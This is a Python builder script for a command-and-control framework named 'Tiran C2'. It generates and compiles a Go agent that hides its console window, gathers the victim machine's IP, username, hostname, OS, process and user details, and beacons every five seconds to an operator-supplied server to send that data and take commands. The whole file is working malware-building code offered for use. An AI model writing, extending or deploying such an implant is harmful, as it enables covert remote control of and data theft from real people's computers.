from SetConfigs import SetConfigs
import json
import argparse
import os
import shutil

class TiranC2:

    def __init__(self):
        
        self.parser = argparse.ArgumentParser(
            prog="Tiran C2",
            description="C2 framework builded by RealDutch77",
            epilog="Please define the configs to be used"
        )

        self.parser.add_argument("-c", "--config")
        self.parser.add_argument("-b", "--build")
        self.parser.add_argument("-o", "--output")

        self.args=self.parser.parse_args()

        self.config = self.args.config
        self.build = self.args.build
        self.output = self.args.output

        if self.config:
            if os.path.exists(self.config):
                Run(self.config)
        if self.build and self.output:
            Build(self.build, self.output)
        else:
            print("[-] Please use an config file")

class Build:
    def __init__(self, server, filename):
        
        self.server = server
        self.filename = filename
        
        self.build(self.server, self.filename)

    def printbuild(self):
        return f"""
Build info
[+] Server: {self.server}
[+] Filename: {self.filename}"""
    
    def maingo(self, server):
        firstchunk = '''
package main

import (
	"TiranC2/Hardware"
	"TiranC2/Interact"
	"fmt"
	"time"
)

func Run() {
	Hardware.GetIP()
	Hardware.Getusername() // Start up  Funtions
	Hardware.Getram()      // Start up  Funtions
	Hardware.GetOS()
	Hardware.GetPID()
	Hardware.GetProcessName()
	Hardware.GetHostname()
	Hardware.GetSystemLan()
	Hardware.Getuid()
}

func ReturnCommand() {
'''
        middlechuck =  f'     var server = "{server}"'
        lastchunk = '''
    for true {
        fmt.Print("Waiting 5 secodns")
        time.Sleep(5 * time.Second)
        Interact.Interact(Interact.ServerADD(server, Hardware.UID), Hardware.ComputerUsername, Hardware.ComputerRAM, Hardware.OS, Hardware.PID, Hardware.ProcName, Hardware.Hostname, Hardware.SysLan, Hardware.IP, server)
    }
}
func main() {
    Run() 
    ReturnCommand()
}
    '''
        fullchunk = f"{firstchunk}{middlechuck}{lastchunk}"
        return fullchunk
   
    def build(self, server, filename):
        golangfileclient = f"../../Agent/main.go"
        with open(golangfileclient, "w+") as f:
            f.write(self.maingo(server))
            f.close()
            with open (golangfileclient, "r+") as content:
                f1 = content.read()
                if f1 == self.maingo(server):
                    print("[+] Successfully wrote the client.")

                    os.chdir("..")
                    os.chdir("..")
                    os.chdir("Agent")

                    print("[+] Compiling Agent...")
                    os.system(f'go build -ldflags "-w -H=windowsgui" -o {filename} main.go')
                    print(f"[+] Created Client: {filename}")

                    print("[+] Moving file...")
                    shutil.move(filename, f"../Compiled/{filename}")
                    print("[+] Successfully moved file, file can be found in the compiled folder")

class Run:
    
    def __init__(self, jsonPath):
        
        self.jsonPath = jsonPath
        self.Json = self.getJson(self.jsonPath)
        
        SetConfigs(
            self.Json["Server"][0]["host"],
            self.Json["Server"][0]["port"],
            self.Json["UI"][0]["host"],
            self.Json["UI"][0]["port"],
            self.Json["Server"][0]["settings"][0]["lootdir"][0]["stock"],
            self.Json["Server"][0]["settings"][0]["lootdir"][0]["custum"],
            self.Json["configName"]

        )

        
   
    def getJson(self, path):
        f = open(path)
        data = json.load(f)
        f.close()
        # print(data["Settings"][0]["Server"][0]["host"])
        return data["Settings"][0]

TiranC2()
# Run("Configs/config1.json")
# print(getJson("Server/Flask/Configs/config1.json")["Server"][0]["host"])
# SetConfigs("cmd", )